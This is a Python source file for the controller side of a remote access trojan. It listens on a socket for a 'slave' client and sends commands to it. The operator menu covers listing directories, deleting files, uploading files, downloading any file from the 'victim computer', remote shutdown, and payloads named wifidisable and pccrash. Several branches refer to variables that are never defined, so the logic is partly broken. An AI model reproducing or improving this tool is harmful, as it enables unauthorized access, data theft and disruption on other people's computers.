
#acces files remotely
# * Gain acces to different directories
# * View Files
# * Download Files
# * Remove Files
# * Remove Directories
# * Send Files
# * Create Directory

#shut down remotly

import time
import sys
import os
import socket

s = socket.socket()
host=socket.gethostname()
port=8080
s.bind((host,port))
print("")
print(" Server is currently running @ ", host)
print(" Waiting for any incoming connect...")
s.listen(1)
conn, addr = s.accept()
print("")
print(addr, " Has connected to the server successfully ")

# connection has been completed

# command handling

while 1:
    print("")
    command = input(str("Command >>"))
    if command == "view_cwd":
        conn.send(command.encode())
        print("")
        print("Command sent waiting for execution ...")
        print("")
        print("Command has been executed successfully")
        files = conn.recv(5000)
        files = files.decode()
        print("Command output : ", files)

    elif command == "custom_dir":
        conn.send(command.encode())
        print("")
        user_input = input(str("Custom Dir : "))
        conn.send(user_input.encode())
        print("")
        print("Command has been sent")
        print("")
        files = conn.recv(5000)
        files = files.decode()
        print("Custom Dir Result : ", files)
        

    elif command == "remove_file":
        conn.send(command.encode())
        fileanddir = input(str("Please enter the filename and directory : "))
        conn.send(fileanddir.encode())
        print("")
        print(" Command has been executed succesfully : File Removed")

    elif command == "send_files":
        conn.send(command.encode())
        file = input(str("Please enter the filename and directory of the file :"))
        filename = input(str("Please enter the filename for the file being sent : "))
        data = open(file, "rb")
        file_data = data.read(7000)
        conn.send(filename.encode())
        print(file, "Has been sent succesfully")
        conn.send(file_data)

    elif command == "download_files":
       conn.send(command.encode())
       filename = input(str("Please enter the filepath including the filename : "))
       conn.send(filename.encode())
       file = conn.recv(100000)
       filename = input(str("Please enter a filename fo the incoming file including the extension : "))
       new_file = open(filename, "wb")
       new_file.write(file)
       new_file.close()
       print("")
       print(filename, " Has bee downloaded and saved")
       print("")

    elif command == "help":
        print("view_cwd = view where is stored slave file in target pc")
        print("custom_dir = you can see every directory in target pc")
        print("remove_file = you can remove any file with this")
        print("send_files = you can send any tipe of files with this")
        print("download_files = you can download and save any tipe of file that is on victim computer")
        print("shutdown = you can remotely shutdown any windows computer with this")
        
    elif command == "shutdown":
        conn.send(command.encode())
        print("")
        print(" Command has been sent successfully ")
        data = conn.recv(1024)
        
    elif data:
        print("Shutdown Command has been recieved and executed")
        print("")
        
    elif command == "Win_Payload":
        print("[ wifidisable, pccrash, Payload_3 ]")
        Type_of_payload = str(input("What payload do you want to use? : "))

    elif Type_of_payload == "wifidisable":
        conn.send(command.encode())
        print("")
        print(" Command has been sent successfully ")
        data2 = conn.recv(1024)
        
    elif data2:
        print("wifidisable Command has been recieved and executed")
        print("")
        
    elif Type_of_payload == "pccrash":
        conn.send(command.encode())
        print("")
        print(" Command has been sent successfully ")
        data3 = conn.recv(1024)
        
    elif data3:
        print("pccrash Command has been recieved and executed")
        print("")
    
    elif Type_of_payload == "appbomber":
        conn.send(command.encode())
        print("")
        print(" Command has been sent successfully ")
        data4 = conn.recv(1024)
        
    elif data4:
        print("pccrash Command has been recieved and executed")
        print("")

        
    

    else:
        print("")
        print("Command not recognised")
         

    
